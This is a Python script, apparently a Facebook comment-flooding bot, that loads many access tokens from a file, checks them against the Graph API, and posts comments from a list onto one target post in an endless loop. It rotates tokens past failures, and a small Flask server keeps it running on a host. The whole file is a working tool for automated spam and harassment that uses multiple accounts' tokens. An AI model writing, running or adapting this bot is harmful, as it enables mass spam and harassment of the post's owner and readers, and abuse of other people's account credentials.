import requests
import time
import os
from platform import system
from flask import Flask
import threading

app = Flask(__name__)

# Token Validation Function
def validate_token(token):
    url = f"https://graph.facebook.com/v17.0/me?access_token={token}"
    response = requests.get(url)
    if response.status_code == 200:
        return True
    else:
        print(f"[!] Token Invalid or Expired: {token}")
        return False

# Clear Screen Function
def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

# Post Comments Function
def post_comments():
    # Read Post Link
    with open('postlink.txt', 'r') as file:
        post_url = file.read().strip()
    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {'User-Agent': 'Mozilla/5.0'}
    comment_index = 0

    while True:
        try:
            # Read and validate tokens from tokens.txt
            with open('tokens.txt', 'r') as file:
                tokens = [token.strip() for token in file.readlines()]
            valid_tokens = [token for token in tokens if validate_token(token)]

            if not valid_tokens:
                print("[!] No valid tokens found. Retrying in 60 seconds...")
                time.sleep(60)
                continue

            # Read comments from comments.txt
            with open('comments.txt', 'r') as file:
                comments = [comment.strip() for comment in file.readlines()]

            # Start posting comments
            for token in valid_tokens:
                comment = comments[comment_index % len(comments)]
                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': token, 'message': comment}
                response = requests.post(url, data=parameters, headers=headers)

                # Handle response status
                if response.status_code == 200:
                    print(f"[+] Comment Sent: {comment} using token {token}")
                    comment_index += 1  # Move to next comment
                else:
                    print(f"[x] Failed to send comment: {response.json().get('error', {}).get('message', 'Unknown error')}")
                    if response.status_code == 403 or 'error' in response.json():
                        print(f"[!] Skipping invalid token {token}... Retrying with next token.")
                        time.sleep(5)  # Wait for 5 seconds before using next token
                        continue

                # Normal sleep delay
                time.sleep(speed)

        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(60)  # Wait for a minute before retrying

# Function to run post_comments in a separate thread
def start_commenting_thread():
    commenting_thread = threading.Thread(target=post_comments)
    commenting_thread.daemon = True  # This ensures the thread will exit when the main program does
    commenting_thread.start()

# Web Server Route
@app.route('/')
def home():
    return "The script is running!"

if __name__ == '__main__':
    cls()
    start_commenting_thread()  # Start the commenting in a separate thread
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
